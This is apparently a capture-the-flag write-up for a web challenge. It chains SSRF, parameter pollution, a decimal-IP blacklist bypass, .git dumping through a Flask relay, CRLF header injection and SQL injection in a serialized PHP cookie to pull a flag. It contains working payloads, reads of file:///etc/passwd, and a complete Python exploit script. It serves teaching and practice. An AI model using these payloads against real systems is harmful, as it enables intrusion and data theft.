# Internal Breach

## Description

**category:** web
**points:** 350
**keywords:** SSRF, CLRF, HPP, SQLi, Git-RIP

Can I Say Something Really Funny? No i'm not in the mood for it. 
Just find the flag sharing server on my local network of 11.10.10.0/24.

**hints:**
- Always try to read the source first.
- Git is your friend.

## Solution
We are given a website that simply does nothing, just show whatever page that you want in url field.
At first look it seems like local file inclusion or directory traversal.

Let's check some urls:
```
http://localhost:8883/cgi-bin/index.py?url=http://google.com
http://localhost:8883/cgi-bin/index.py?url=file:///etc/passwd
```

Ok, so we can see source of files, let's locate them first:
```
http://localhost:8883/cgi-bin/index.py?url=file:///etc/apache2/sites-enabled/000-default
```
And we see that files are located at /usr/lib/cgi-bin
```
http://localhost:8883/cgi-bin/index.py?url=file:///usr/lib/cgi-bin/index.py
```

By reading the source we can find out that there are some restrictions. First one is url character limit that can be bypassed with HPP injection, and
the second url blacklist bypassing with decimal conversion of sites that we want.

```
http://11.10.10.2/cgi-bin/index.py?url=%20&url=http://185207373
```

Now just clone dvcs-ripper and try to download the .git files on the server.

Simply wrote a script like git-relay-server.py as below and start it, Then run dvcs-ripper on our local server with acts as a proxy.

```python
#!/usr/bin/env python
from flask import Flask, abort
import urlparse
import requests

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    url = "http://11.10.10.2/cgi-bin/index.py?url=%20&url=http://185207373/{}".format(path)
    resp = requests.get(url)
    try:
        resp_text = eval(resp.text)
    except:
        resp_text = resp.text
        
    if not resp_text or resp_text in ['\n', '\r', '\r\n']:
        abort(404)

    out = resp_text
    return out

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5001)
```
Now start this flask server and execut3 below code:
```
perl rip-git.pl -s -v -u http://localhost:5001/.git -o ./out
```

This is a simple php website that just check for USERINFO cookie, unserialize it and then try
to query on database and fetch user-info.
The problem is that it does all this with Cookie not Session! and also there is a sql injection
vulnerability in parsing COOKIE.

here are the codes:

index.php
```php
<?php
require_once("utils/inc.php");

$title .= " | Account";

$username = isset($_POST['username']) ? $_POST['username'] : NULL;
$password = isset($_POST['password']) ? $_POST['password'] : NULL;

?>

<?php include("utils/header.php"); ?>


  <div id="content-wrapper">
    <div id="content">
      <h3>This is a template site to give you the flag... Because this is a CTF challenge, I will not fool you with lot's of code review.</h3>
      <h5>Read my source and find a way to get the flag...</h5>
    </div>
  </div>
  
    <div id="sidebar-wrapper">
    <div id="sidebar">
      <?php if (isset($_COOKIE['login']) && $_COOKIE['login']) { ?>
        <h1>Hello <?=$users['username']?>! (id=<?=$users['id']?>)</h1>
        <h3>Welcome...</h3>

      <form method="POST"><input type="submit" value="Logout" name="logout"></form>
      <?php } else { ?>
        <h3>Login</h3>
        <form method="POST">
          <label>username</label><br>
          <input type="text" name="username"><br><br>
          <label>password</label><br>
          <input type="password" name="password"><br><br>
          <input type="submit" value="Login">
          <a href="#">Register</a><br><br><br><br>
        </form>
      <?php } ?>
    </div>
  </div>
  

<?php include("utils/footer.php"); ?>
```

inc.php
```php
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

date_default_timezone_set('Asia/Tehran');

$title = "Flag sharing website";
$navbar = [
  "Home" => ".",
];

$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

require("db.php");


if(isset($_COOKIE['USERINFO'])) {
    $temp = base64_decode($_COOKIE['USERINFO']);
    $users = unserialize($temp);
    $users = db_one("SELECT * FROM users WHERE id='(".$users['id'].")'");
    $_COOKIE['USERINFO'] = base64_encode(serialize($users));
}
```

The vulnerable Cookie is stored in USERINFO cookie, and each time index in rendering, a query is made to fetch user id and username.

But there is a problem. How we're gonna send this payload with ***ssrf***!

Let's check if there is any ***clrf*** injection.

Testing for clrf:
```
GET /cgi-bin/index.py?url=%20&url=http://185207373%0aX-injected:%20header%0ax-leftover:%20:80/index.php HTTP/1.1
Host: 11.10.10.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

Cool... we got the below response:
```
HTTP/1.1 200 OK
Date: Sat, 10 Feb 2018 16:47:02 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1911
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

b'\r\n<!DOCTYPE html>\n<html>\n<head>\n<title>\n  Flag sharing website | Account</title>\n<meta name="author
```

With clrf we can extend our ssrf request to vulnerable server and put our Cookie values.
This is a simple error based sqli, but the payload should be created as below:
- serialize
- base64 encode
- urlencode and put in http header (Cookie value) in this format: ```Cookie: USERINFO={}; login=true```

last query to get the flag:
```
a:2:{s:2:"id";s:56:"0)' union select flag,2,3 from flag limit 1 offset 0; # ";s:8:"username";s:0:"";}
```
and it's base64 encoded is:
```
YToyOntzOjI6ImlkIjtzOjU2OiIwKScgdW5pb24gc2VsZWN0IGZsYWcsMiwzIGZyb20gZmxhZyBsaW1pdCAxIG9mZnNldCAwOyAjICI7czo4OiJ1c2VybmFtZSI7czowOiIiO30=
```

Here is the final code to fetch the flag:
```python
#!/usr/bin/env python3

import base64, requests, readline, code, re, warnings
import requests
import sys
import urllib

warnings.filterwarnings('ignore')

userid = "0)' union select flag,2,3 from flag ;# "
serial = 'a:2:{s:2:"id";s:%s:"%s";s:8:"username";s:0:"";}'
serial = serial % (len(userid), userid)
user_info = base64.b64encode(serial.encode()).decode()

request = """

Cookie: USERINFO={}; login=true
Connection: Keep-Alive

x-leftover:

""".format(user_info)

x = urllib.quote_plus(request).replace('+', '%20').replace('%3A', ':').replace('%3D', '=').replace('%0A%0A', '%0d%0a')
# print(x)
url = 'http://11.10.10.54/cgi-bin/index.py?url=%20&url=http://185207373{}:80/index.php'.format(x)

r = requests.get(url)

regex = re.compile('\(id=(.+)\)')
t = regex.search(r.text)
try:
    print( t.groups()[0])
except:
    print(r.text)

```
And will print the flag for us.